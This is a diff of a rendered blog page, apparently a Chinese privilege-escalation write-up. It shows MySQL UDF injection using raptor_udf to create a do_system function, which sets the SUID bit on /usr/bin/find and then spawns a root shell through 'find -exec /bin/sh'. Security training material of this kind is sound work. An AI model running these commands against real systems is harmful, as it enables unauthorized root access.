+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(line <span class="type">blob</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> foo <span class="keyword">values</span>(load_file(<span class="string">&#x27;/var/www/html/raptor_udf1.so&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;raptor_udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628211948175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li>find提权</li>
 </ul>
 <p>通过do_system函数给find目录所有者的suid权限</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> do_system<span class="token punctuation">(</span><span class="token string">'chmod u+s /usr/bin/find'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212040242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> finn
-<span class="token function">find</span> finn <span class="token parameter variable">-exec</span> <span class="token string">"/bin/sh"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> finn</span><br><span class="line">find finn -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure>
 
 <p>完成！看到shell标识变了</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628212226260.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
